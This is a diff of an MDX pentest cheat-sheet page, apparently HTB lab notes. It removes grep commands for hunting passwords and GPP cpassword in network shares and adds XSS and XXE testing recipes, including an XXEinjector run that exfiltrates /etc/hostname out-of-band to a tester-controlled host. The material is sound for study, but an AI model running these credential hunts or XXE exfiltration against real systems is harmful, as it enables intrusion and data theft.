-<Accordion title="Recommended attack order">
+<Accordion title="DOM XSS: follow source to sink">
 
-### Recommended attack order
+### DOM XSS: follow source to sink
 
-**Find Credentials in Network Shares**
+**XSS (Cross-Site Scripting)**
 
-Context from the notebook: grep -ri "$&#123;DOMAIN&#125;\\\\"  ←  always start here
-
-```text
-grep -ri "${DOMAIN}\\\\"
+```bash
+# Download an observed script path, rather than guessing that it exists.
+curl -sS "$BASE/js/app.js" -o app.js
+rg -n 'location\.(search|hash)|document\.URL|innerHTML|outerHTML|document\.write|insertAdjacentHTML|eval\(' app.js
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Find Credentials in Network Shares — Recommended attack order](/password-attacks/credential-hunting-in-network-shares#recommended-attack-order)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Find Credentials in Network Shares**
-
-Context from the notebook: grep -ri "cpassword"  ← instant GPP win if present
-
-```text
-grep -ri "cpassword"
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Find Credentials in Network Shares — Recommended attack order](/password-attacks/credential-hunting-in-network-shares#recommended-attack-order)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-**Find Credentials in Network Shares**
-
-Context from the notebook: Context grep:  grep -riE -C 3 "passw"  to pair users with passwords
-
-```text
-grep -riE -C 3 "passw"
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Find Credentials in Network Shares — Recommended attack order](/password-attacks/credential-hunting-in-network-shares#recommended-attack-order)
+**Original note sections:** [XSS (Cross-Site Scripting) — DOM XSS: follow source to sink](/web/xss#dom-xss-follow-source-to-sink)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
 
 </Accordion>
 
-<Accordion title="2. chisel (SOCKS + port forwards)">
+<Accordion title="Locate the input and its consumers">
 
-### 2. chisel (SOCKS + port forwards)
+### Locate the input and its consumers
 
-**Pivoting and File Transfer: Field Reference**
+**XSS (Cross-Site Scripting)**
 
-Context from the notebook: R:  =  reverse  (pivot connects out to Kali — works through egress firewalls). Match the SOCKS port to proxychains. Verify it's up:  ss -tlnp | grep 1080 .
-
-```text
-ss -tlnp | grep 1080
+```bash
+BASE='http://app.htb'
+curl -sS -G --data-urlencode 'q=xss-search-01' "$BASE/search.php" -o response.html
+rg -n -C 3 'xss-search-01' response.html
 ```
 
 {/* VAULT_ORIGINAL_LINK_START */}
 
-**Original note sections:** [Pivoting and File Transfer: Field Reference — 2. chisel (SOCKS + port forwards)](/cheatsheets/pivoting-file-transfer#2-chisel-socks-+-port-forwards) · [Pivoting and File Transfer: Field Reference — 🧯 CAVEATS TABLE](/cheatsheets/pivoting-file-transfer#-caveats-table) · [Pass the Ticket from Linux — Troubleshooting quick reference](/password-attacks/pass-the-ticket-from-linux#troubleshooting-quick-reference)
+**Original note sections:** [XSS (Cross-Site Scripting) — Locate the input and its consumers](/web/xss#locate-the-input-and-its-consumers)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Send a saved XML body without shell damage">
+
+### Send a saved XML body without shell damage
+
+**XXE: XML External Entity Injection**
+
+```bash
+BASE='http://TARGET:PORT'
+SESSION='REPLACE_WITH_CURRENT_SESSION'
+mkdir -p evidence/xxe
+cat > evidence/xxe/probe.xml <<'XML'
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY marker "XXE-PROBE-742">]>
+<root><name>&marker;</name><details>Test</details><date>2026-11-09</date></root>
+XML
+curl -sS --compressed -b "PHPSESSID=$SESSION" \
+  -H 'Content-Type: text/plain;charset=UTF-8' \
+  --data-binary @evidence/xxe/probe.xml \
+  -D evidence/xxe/response.headers -o evidence/xxe/response.body "$BASE/addEvent.php"
+rg -n 'XXE-PROBE|entity|DOCTYPE|error' evidence/xxe/response.body
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [XXE: XML External Entity Injection — Send a saved XML body without shell damage](/web/xxe#send-a-saved-xml-body-without-shell-damage)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="XXEinjector after understanding the manual flow">
+
+### XXEinjector after understanding the manual flow
+
+**XXE: XML External Entity Injection**
+
+```bash
+# Inspect the generated request first; this is the tool's test mode.
+ruby XXEinjector.rb --host=YOUR_VPN_IP --httpport=8000 \
+  --file=xxe.req --path=/etc/hostname --oob=http --phpfilter --test
+
+# Then reproduce the module's lab recipe.
+ruby XXEinjector.rb --host=YOUR_VPN_IP --httpport=8000 \
+  --file=xxe.req --path=/etc/hostname --oob=http --phpfilter
+rg --files Logs
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [XXE: XML External Entity Injection — XXEinjector after understanding the manual flow](/web/xxe#xxeinjector-after-understanding-the-manual-flow)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
+
+<Accordion title="Verify the forwarded application">
+
+### Verify the forwarded application
+
+**curl**
+
+```bash
+ss -lntp | grep ':18080'
+curl -sS -D - http://127.0.0.1:18080/
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Systems & Pivoting: Enumeration Methodology — 6. Test the local listener, then the application](/pivoting/methodology#6-test-the-local-listener-then-the-application)
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
@@ -1700,6 +2075,10 @@ ss -tlnp | grep 1080
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://www.gnu.org/software/grep/manual/grep.html)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -1707,5 +2086,3 @@ ss -tlnp | grep 1080
 - [Find Credentials on Linux](/password-attacks/credential-hunting-in-linux)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
